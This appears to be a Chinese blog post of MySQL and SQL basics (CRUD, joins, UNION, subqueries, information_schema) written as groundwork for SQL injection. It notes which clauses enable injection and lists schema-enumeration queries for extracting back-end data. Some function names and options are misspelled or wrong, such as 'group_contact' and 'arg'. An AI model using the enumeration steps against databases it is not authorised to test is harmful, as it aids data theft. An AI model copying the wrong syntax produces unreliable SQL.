        <content type="html"><![CDATA[<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>数据库是“按照数据结构来组织、存储和管理数据的仓库”。是一个长期存储在计算机内的、有组织的、可共享的、统一管理的大量数据的集合。</p><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><p>数据库是存放数据的仓库。它的存储空间很大，可以存放百万条、千万条、上亿条数据。但是数据库并不是随意地将数据进行存放，是有一定的规则的，否则查询的效率会很低。当今世界是一个充满着数据的互联网世界，充斥着大量的数据。即这个互联网世界就是数据世界。数据的来源有很多，比如出行记录、消费记录、浏览的网页、发送的消息等等。除了文本类型的数据，图像、音乐、声音都是数据。</p><p>数据库是一个按数据结构来存储和管理数据的计算机软件系统。数据库的概念实际包括两层意思：</p><p>（1）数据库是一个实体，它是能够合理保管数据的“仓库”，用户在该“仓库”中存放要管理的事务数据，“数据”和“库”两个概念结合成为数据库。</p><p>（2）数据库是数据管理的新方法和技术，它能更合适的组织数据、更方便的维护数据、更严密的控制数据和更有效的利用数据。</p><p>数据库作为最重要的基础软件，是确保计算机系统稳定运行的基石。</p><h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><h6 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h6><p>用于放置一些可执行文件，如 mysql.exe、mysqld.exe、mysqlshow.exe 等。</p><h6 id="docs"><a href="#docs" class="headerlink" title="docs"></a>docs</h6><p>存放一些文档</p><h6 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h6><p>登录数据库后，可使用 <code>SHOW GLOBAL VARIABLES LIKE &quot;%Datadir%&quot;;</code> 命令查看 Data 目录位置。</p><p>Data 目录中用于放置一些<strong>日志文件</strong>以及<strong>数据库</strong>。我们创建和保存的数据都存在这个目录里。打开 Data 目录，结构如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/5-20041615113A57.png"></p><h6 id="include"><a href="#include" class="headerlink" title="include"></a>include</h6><p>用于放置一些头文件，如：mysql.h、mysql_ername.h 等。</p><h6 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h6><p>用于放置一系列库文件</p><h6 id="share"><a href="#share" class="headerlink" title="share"></a>share</h6><p>用于存放字符集、语言等信息</p><h6 id="my-ini-文件"><a href="#my-ini-文件" class="headerlink" title="my.ini 文件"></a>my.ini 文件</h6><p>my.ini 是 MySQL 默认使用的配置文件，一般情况下，只要修改 my.ini 配置文件中的内容就可以对 MySQL 进行配置。</p><p>（在linux&#x2F;unix系统中名称是my.cnf）</p><p>除了上述介绍的目录，MySQL 安装目录下可能还有几个后缀名为<code>.ini</code>的配置文件，不同的配置文件代表不同的含义。</p><p>my.ini 是 MySQL 默认使用的配置文件，其它的配置文件都是适合不同数据库的配置文件的模板，在文件名中就说明了适合的数据库类型，下面对这几个配置文件进行详细讲解。</p><ul><li>my-huge.ini：适合超大型数据库的配置文件。</li><li>my-large.ini：适合大型数据库的配置文件。</li><li>my-medium.ini：适合中型数据库的配置文件。</li><li>my-small.ini：适合小型数据库的配置文件。</li><li>my-template.ini：是配置文件的模板，MySQL 配置向导将该配置文件中选择项写入到 my.ini 文件。</li><li>my-innodb-heavy-4G.ini：表示该配置文件只对于 InnoDB 存储引擎有效，而且服务器的内存不能小于 4GB。</li></ul><h5 id="登录命令"><a href="#登录命令" class="headerlink" title="登录命令"></a>登录命令</h5><p> mysql -h ip -u username -p password -p port  &#x2F;&#x2F;h指主机默认localhost可以省略，port默认3306可以省略</p><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p><strong>关系型数据库</strong></p><p>关系型数据库，存储的格式可以直观地反映实体间的关系。关系型数据库和常见的表格比较相似，关系型数据库中表与表之间是有很多复杂的关联关系的</p><p>常见的有：mysql，Oracle，mssql，pgsql，sqlite</p><p>虽然关系型数据库有很多，但是大多数都遵循SQL（结构化查询语言，Structured Query Language）标准。</p><p><strong>非关系型数据库</strong></p><p>随着近些年技术方向的不断拓展，大量的NoSql数据库如MongoDB、Redis、Memcache出于简化数据库结构、避免冗余、影响性能的表连接、摒弃复杂分布式的目的被设计。</p><p>常见的有：MongoDB、Redis、Memcache</p><h4 id="数据库管理系统-（dd）"><a href="#数据库管理系统-（dd）" class="headerlink" title="数据库管理系统 （dd）"></a>数据库管理系统 （dd）</h4><p>Database ManagementSystem (DBMS)</p><p>mysql是一种关系型数据库管理系统</p><p><strong>关系数据库管理系统</strong>（Relational Database Management System：RDBMS）是指包括相互联系的逻辑组织和存取这些数据的一套程序 (数据库管理系统软件)。关系数据库管理系统就是管理关系数据库，并将数据逻辑组织的系统。</p><p>每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</p><p>我们也可以将数据存储在文件中，但是在文件中读写数据速度相对较慢。</p><p>所以，现在我们使用关系型数据库管理系统（RDBMS）来存储和管理大数据量。所谓的关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p><p>RDBMS 是 SQL 的基础，同样也是所有现代数据库系统的基础</p><p>RDBMS 即关系数据库管理系统(Relational Database Management System)的特点：</p><ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><p><strong>SQL</strong> (Structured Query Language:<strong>结构化查询语言</strong>) 用于管理<strong>关系数据库管理系统（RDBMS）</strong>。</p><h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><p>SQL语言共分为四大类：</p><h6 id="DQL：数据查询语言"><a href="#DQL：数据查询语言" class="headerlink" title="DQL：数据查询语言"></a>DQL：数据查询语言</h6><p>（<strong>Data QueryLanguage</strong>）</p><p>数据查询语言DQL基本结构是由SELECT子句，FROM子句，WHERE 子句组成的查询块： <strong>select</strong>&lt;字段名表&gt; <strong>from</strong> &lt;表或视图名&gt; <strong>where</strong> &lt;查询条件&gt;</p><h6 id="DML：数据操纵语言"><a href="#DML：数据操纵语言" class="headerlink" title="DML：数据操纵语言"></a>DML：数据操纵语言</h6><p>（<strong>Data Manipulation Language</strong>）</p><p>数据操纵语言DML主要有三种形式： 1) 插入：<strong>insert</strong> 2) 更新：<strong>update</strong> 3) 删除：<strong>delete</strong></p><h6 id="DDL：数据定义语言"><a href="#DDL：数据定义语言" class="headerlink" title="DDL：数据定义语言"></a>DDL：数据定义语言</h6><p>(<strong>Data Definition Language</strong>)</p><p>是用于描述数据库中要[存储]的现实世界实体的语言。</p><p>数据定义语言DDL用来创建数据库中的各种对象—–表、视图、 索引、同义词、聚簇等如： <strong>create&#x2F;alter</strong> table&#x2F;view&#x2F;index&#x2F;syn&#x2F;cluster</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221013183258468-1024x663.png" style="zoom:50%;" /><h6 id="DCL：数据控制语言"><a href="#DCL：数据控制语言" class="headerlink" title="DCL：数据控制语言"></a>DCL：数据控制语言</h6><p>(<strong>Data Control Language</strong>)</p><p>是一种可对数据访问权进行控制的指令，它可以控制特定用户账户对数据表、查看表、存储程序、用户自定义函数等数据库对象的控制权。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> grant: 授权。</span><br><span class="line"> grant 权限1,权限2,...,权限n on 指定数据库名.* to 用户名@IP;  -&gt;设置权限特定数据库特定权限</span><br><span class="line"> grant all on 指定数据库名.* to 用户名@IP;                   -&gt;设置权限特定数据库全部权限</span><br><span class="line"> grant 权限1,权限2,...,权限n on *.* to 用户名@IP;            -&gt;设置权限全部数据库特定权限</span><br><span class="line"> show grants for 用户名@IP;                                 -&gt; 查询权限</span><br><span class="line"> ​</span><br><span class="line"> revoke:撤销授权        -&gt;语法同上</span><br><span class="line"> ​</span><br><span class="line"> TCL（Transaction Control Language）事务控制语言</span><br><span class="line"> ​</span><br><span class="line"> rollback：事务处理回退</span><br><span class="line"> savepoint：设置保存点</span><br><span class="line"> lock：对数据库的特定部分进行锁定</span><br></pre></td></tr></table></figure><h5 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h5><p>SQL 的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。—》增删改查</p><p>先看一些重要语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">     SELECT - 从数据库中提取数据</span><br><span class="line">     UPDATE - 更新数据库中的数据</span><br><span class="line">     DELETE - 从数据库中删除数据</span><br><span class="line">     INSERT INTO - 向数据库中插入新数据</span><br><span class="line">     CREATE DATABASE - 创建新数据库</span><br><span class="line">     ALTER DATABASE - 修改数据库</span><br><span class="line">     CREATE TABLE - 创建新表</span><br><span class="line">     ALTER TABLE - 变更（改变）数据库表</span><br><span class="line">     DROP TABLE - 删除表</span><br><span class="line">     CREATE INDEX - 创建索引（搜索键）</span><br><span class="line">     DROP INDEX - 删除索引</span><br></pre></td></tr></table></figure><h6 id="库-表操作"><a href="#库-表操作" class="headerlink" title="库&#x2F;表操作"></a>库&#x2F;表操作</h6><p>RDBMS-&gt;database -&gt;table -&gt;column -&gt;information</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> create database a01;   -&gt;创建名为a01的数据库（实际上是在data目录下创建了一个文件夹）</span><br><span class="line"> show databases;   -&gt;显示当前所有数据库</span><br><span class="line"> drop database a01;   -&gt;删除a01数据库</span><br></pre></td></tr></table></figure><p>先创建一个数据库表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> create table employee</span><br><span class="line"> (</span><br><span class="line"> id int,</span><br><span class="line"> name varchar(40),</span><br><span class="line"> sex varchar(4),</span><br><span class="line"> birthday date,</span><br><span class="line"> entry_date date,</span><br><span class="line"> salary decimal(8,2),</span><br><span class="line"> resume text</span><br><span class="line"> );</span><br></pre></td></tr></table></figure><p><strong>约束</strong>：主要有六种</p><p>1.<strong>外键约束</strong>（Foreign key）</p><p>通常用于两张表的关联</p><p>2.<strong>唯一约束</strong>（Unique key）</p><p>主要用于：手机号，身份证号这种有唯一性的</p><p>3.<strong>检查约束</strong>（check）</p><p>4.<strong>主键约束</strong>（Primary key）</p><p>一条数据的唯一标识，通常和（auto_increment）自增结合使用。例如：id</p><p>5.<strong>非空约束</strong>（Not Null）</p><p>一条数据不能为空</p><p>6.<strong>默认值约束</strong>（default constant）</p><p>例如：性别默认为女</p><h6 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 增：insert</span><br><span class="line"> 删：delete</span><br><span class="line"> 改：update</span><br><span class="line"> 查：SELECT或者show</span><br></pre></td></tr></table></figure><p><strong>增</strong> insert into 表名（列名1，列名2） values（值1，值2）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 指定某些列插入数据：insert into employee(id) values(6);</span><br><span class="line"> 插入汉字：insert into employee(id,name) values(6,&#x27;张三&#x27;);</span><br></pre></td></tr></table></figure><p><strong>删</strong> delete from 表 where ···</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> 删除表中job=ccc的所有记录：delete from employee where job=&#x27;ccc&#x27;;</span><br><span class="line"> 删除表中所有记录：delete from employee;</span><br></pre></td></tr></table></figure><p><strong>改</strong> update 表 set ···where ···；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将所有员工薪水修改为5000元：update employee set salary=5000;</span><br><span class="line"> </span><br><span class="line">将姓名为’zs’的员工薪水修改为3000元：update employee set salary = 3000 where name=&#x27;zhangsan&#x27;;</span><br></pre></td></tr></table></figure><p><strong>查</strong> select ··· from ···where ···</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询表中所有学生的信息：select id,name,chinese,english,math from student;</span><br><span class="line">查询表中所有学生的姓名和对应的英语成绩：select name,english from student;</span><br><span class="line">查询姓名为wu的学生成绩：select * from student where name=&#x27;张三&#x27;;</span><br><span class="line">查询英语成绩大于90分的同学：select * from student where english&gt;&#x27;90&#x27;;</span><br></pre></td></tr></table></figure><p>查询是最重要的一项，掌握了查询，才能在找到sql注入点之后利用合适的语句拿到后端数据库数据</p><h6 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h6><p><strong>【简单查询】</strong></p><p>select * from 表名 where 条件 ；<br>e.g:select *from student_information where ID&#x3D;3；</p><p><strong>【投影查询】</strong></p><p>指定字段查询（更适用于生产环境）</p><p>select 字段名1，字段名2 from 表名 where 条件 ；<br>e.g:select stu_age stu_address from student_information where ID&#x3D;3；</p><p><strong>【限制查询】</strong></p><p>关键字：limit -》主要用于筛选数据</p><p>注：limit只能放到sql语句最后！!</p><p>limit n ;(n为查询的数据的条数（从前往后）)</p><p>limit start，lenth； start为开始的下标（从1开始的），lenth为限制的长度；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 字段名1，字段名2 from 表名 where 条件 limit start，lenth；</span><br><span class="line">e.g:select * from student limit 1,3;   - &gt;查询前三条数据</span><br></pre></td></tr></table></figure><p><strong>【条件查询】</strong></p><p>关键字：where</p><p>where 查询条件</p><p>逻辑运算符 and &#x2F;or (not)</p><p>范围关键字 &gt;;&gt;&#x3D;;&lt;;&lt;&#x3D;; &lt;&gt;(!&#x3D;) ;between··· and···；in ···</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where 条件 ；</span><br></pre></td></tr></table></figure><p><strong>【模糊查询】</strong> （可以造成模糊查询注入）</p><p>主要用于搜索</p><p>关键字：like</p><p><strong>占位符</strong>：</p><p>1.**%**：表示零个或多个字符。在某些情况下需要中文查询，一般用两个%来查询，即%%；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name like %数据%;  -&gt;全模糊查询</span><br><span class="line">select * from user where name like 数据%;  -&gt;半模糊查询</span><br><span class="line">select * from user where name like %数据;  -&gt;半模糊查询</span><br></pre></td></tr></table></figure><p>2._(下划线)：表示一个字符，类似于占位符的作用。常用来限定符合查询条件结果的长度；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name like _数据_;</span><br></pre></td></tr></table></figure><p>3.还有类似正则表达式的占位符</p><p>[ ]：表示括号内所列字符中的一个(类似正则表达式)。指定一个字符、字符串或范围，要求所匹配对象为它们中的任一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE &#x27;[张李王]三&#x27; 将找出“张三”、“李三”、“王三”(而不是“张李王三”)；</span><br><span class="line"></span><br><span class="line">SELECT * FROM [user] WHERE u_name LIKE &#x27;老[1-9]&#x27; 将找出“老1”、“老2”、……、“老9”；</span><br></pre></td></tr></table></figure><p>[^ ]：表示不在括号所列之内的单个字符。其取值和 [] 相反，但它要求所匹配对象为指定字符以外的任一个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM [user] WHERE u_name LIKE [ ^ 张李王]三&#x27; 将找出不姓“张”、“李”、“王”的“赵三”、“孙三”</span><br></pre></td></tr></table></figure><p><strong>【排序查询】</strong> （可以造成报错注入）</p><p>关键字：order by&lt;字段名&gt;[ASC&#x2F;DESC] ACI-&gt;升序 ；DESC -&gt;降序 （多字段查询也可以）</p><p>order by &lt;数字(指列名)&gt; (DESC) -&gt;如果超过了列数，就会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select *from student_information order by stu_age ASC；  -&gt;按照年龄升序</span><br><span class="line">select *from student_information order by 3 ASC；  -&gt;按照第三列数据升序</span><br></pre></td></tr></table></figure><p><strong>【分组查询】</strong></p><p>关键字：group by 字段名</p><p>使用 group by 按某个字段，或者多个字段中的值，进行分组，字段中值相同的为一组</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221012214319851-1024x505.png" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221012214407360-1024x506.png" style="zoom: 67%;" /><p>分组相关的<strong>聚合函数</strong>:</p><p>cont(*) -&gt;统计数量</p><p>sum（对象） -&gt;求对象的和</p><p>arg（对象） -&gt;求对象的平均数</p><p>min&#x2F;max(对象) -&gt;求对象中的最大&#x2F;小值</p><p><strong>Having</strong>：主要作用与<strong>where</strong>一样，都是对数据进行过滤</p><p>不同点：</p><p>having的过滤是在查询之后，对内存中的数据过滤，<strong>可以跟聚合函数，用在group_by 之后</strong></p><p>where的过滤是在查询之前，对硬盘上的数据过滤，<strong>不能跟聚合函数，用在group_by 之前</strong></p><p>有一个特殊的函数，<strong>group_contact</strong>，把一个分组的结果集的内容连接（需要和group by 结合使用）</p><p>正常查询：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20190520213752998.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ID ,group_contact(score) from testgroup group by ID  -&gt;查询ID和分数，分数里面将所有数据汇总显示到一栏中</span><br></pre></td></tr></table></figure><p>显示结果</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20190520214432848.png"></p><p><strong>【多表查询】</strong></p><p>表与表的<strong>关系</strong>：</p><p>一对一：两张表有一个字段是关联的，比如stu_id在各个表中都有且一样</p><p>多对多：多个用户买多个商品</p><p>一对多：班级表与学生表，班级表中一个班对应学生表中多个学生</p><p><strong>join</strong></p><p>SQL join 用于把来自两个或多个表的行结合起来。</p><p>下图展示了 LEFT JOIN、RIGHT JOIN、INNER JOIN、OUTER JOIN 相关的 7 种用法。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/sql-join.png" style="zoom:67%;" /><p>SQL JOIN 类型：</p><ul><li><strong>INNER JOIN&#x2F;JOIN</strong>：如果表中有至少一个匹配，则返回行</li><li><strong>LEFT JOIN</strong>：即使右表中没有匹配，也从左表返回所有的行</li><li><strong>RIGHT JOIN</strong>：即使左表中没有匹配，也从右表返回所有的行</li><li><strong>FULL JOIN</strong>：只要其中一个表中存在匹配，则返回行</li></ul><p>语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select··· from table1</span><br><span class="line">inner/left/right/full join table2</span><br><span class="line">on table1.column1=table2.column2</span><br><span class="line">order by ···</span><br></pre></td></tr></table></figure><p><strong>【关联查询】</strong></p><p>关键字：<strong>union</strong></p><p>UNION操作符用于合并两个或多个select语句的结果集。</p><p>请注意，UNION 内部的每个 SELECT 语句必须拥有<strong>相同数量的列</strong>。<strong>列也必须拥有相似的数据类型</strong>。同时，每个 SELECT 语句中的列的顺序必须相同。（关键是要有相同列，这在sql注入中很重要）</p><p><strong>SQL UNION 语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name(s) from table1</span><br><span class="line">union //有重复的只显示一次</span><br><span class="line">select column_name(s) from table2;</span><br></pre></td></tr></table></figure><p><strong>SQL UNION ALL 语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select column_name(s) from table1</span><br><span class="line">union all  //重复也会显示</span><br><span class="line">select column_name(s) from table2;   //UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</span><br></pre></td></tr></table></figure><p>其实就是把union前后的两个表，过滤查到的数据都显示出来</p><p><strong>【子查询】</strong></p><p>有时候，查询时需要的<strong>条件</strong>是另外一个select语句的<strong>结果</strong>，就会使用到子查询。</p><p>本质就是<strong>结果</strong>作为<strong>过滤条件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">e.g:</span><br><span class="line">                    使用子查询进行基于集合的查询             关键字   in   /   not in</span><br><span class="line">//查询与小杨同学在同一个系的同学</span><br><span class="line">//第一步先查询小杨同学所在的系</span><br><span class="line">//然后把系作为已知条件查找同学信息</span><br><span class="line">SELECT * FROM Student</span><br><span class="line">WHERE Sdept IN(SELECT Sdept FROM Student Where Sname =&#x27;小杨&#x27;);</span><br><span class="line">-------------------------------------------------------------------------------------------------</span><br><span class="line">                      使用子查询进行比较查询                  关键字    and</span><br><span class="line">//查询选修了C04课程且课程成绩高于此课程平均成绩的的学生学号和该门课成绩</span><br><span class="line">//先查出C04课程的平均成绩</span><br><span class="line">//然后把平均成绩作为已知条件查找同学学号和成绩</span><br><span class="line">SELECT Sno, Grade FROM SC</span><br><span class="line">WHERE Cno=&#x27;C04&#x27; AND Grade &gt; (SELECT AVG(Grade) FROM SC Where Cno =&#x27;C04&#x27;);</span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line">                     带有ANY和ALL的子查询                   关键字   any /  all</span><br><span class="line">//查询比C03课程成绩都高的选了C04课程的学生的学号和成绩</span><br><span class="line">SELECT Sno, Grade FROM SC</span><br><span class="line">WHERE Cno=&#x27;C04&#x27; AND Grade &gt; ALL(SELECT  Grade  FROM SC Where Cno =&#x27;C03&#x27;);</span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line">                       使用带EXSITS谓词的子查询             关键字     exits</span><br><span class="line">//查询选修了C04课程的学生姓名</span><br><span class="line">SELECT Sname FROM SC</span><br><span class="line">WHERE EXISTS(SELECT * FROM SC Where SC.Sno = Student.Sno  AND  Cno =&#x27;C04&#x27;);</span><br><span class="line">注意，带exists谓词的子查询是先执行外层，再执行内层查询，根据内存查询返回的true和false来判断外层数据是否满足条件。</span><br><span class="line">该语法可以理解为：将主查询的数据，放到子查询中做条件验证，根据验证结果（TRUE 或 FALSE）来决定主查询的数据结果是否得以保留。</span><br></pre></td></tr></table></figure><h4 id="Information-schema"><a href="#Information-schema" class="headerlink" title="Information_schema"></a>Information_schema</h4><h6 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h6><p>Information_schema数据库是<strong>MySQL自带</strong>的，它提供了访问数据库<strong>元数据</strong>的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。 在MySQL中，把 information_schema 看作是一个数据库，确切说是<strong>信息数据库</strong>。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p><h6 id="数据库表说明"><a href="#数据库表说明" class="headerlink" title="数据库表说明"></a><strong>数据库表说明</strong></h6><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221013141157644-1024x1005.png" style="zoom:67%;" /><ul><li><strong>SCHEMATA</strong>表：（重要）提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</li><li><strong>TABLES</strong>表： （重要）提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。关注字段：table_schema -&gt;数据库名，table_name -&gt;表名</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221013141403227-1024x560.png" style="zoom:67%;" /><ul><li><strong>COLUMNS</strong>表： （重要）提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。关注字段：table_schama -&gt;数据库名column_name -&gt;列名table_name -&gt;表名</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221013141604533-1024x682.png" style="zoom:67%;" /><ul><li>STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。</li><li>USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li><li>SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</li><li>TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</li><li>COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</li><li>CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。</li><li>COLLATIONS表：提供了关于各字符集的对照信息。</li><li>COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。</li><li>TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</li><li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li><li>ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</li><li>VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。</li><li>TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表。</li></ul><h6 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h6><p>（sql注入底层语言）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema =&#x27;database()&#x27;-&gt;已知数据库名字求表名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;database()&#x27; </span><br><span class="line">and table_name=&#x27;表名&#x27;  -&gt;已知数据库名字和表名求列名</span><br><span class="line">select 列名 from database().表名 -&gt;已知数据库，表名，列名，拿数据</span><br><span class="line">//如果有特殊要求可以加一个group_contact(table_name/column_name)</span><br></pre></td></tr></table></figure><h4 id="数据库体系结构（dd）"><a href="#数据库体系结构（dd）" class="headerlink" title="数据库体系结构（dd）"></a>数据库体系结构（dd）</h4>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html与css与javascript</title>
      <link href="/2023/05/14/html%E4%B8%8Ecss%E4%B8%8Ejavascript/"/>
      <url>/2023/05/14/html%E4%B8%8Ecss%E4%B8%8Ejavascript/</url>
      
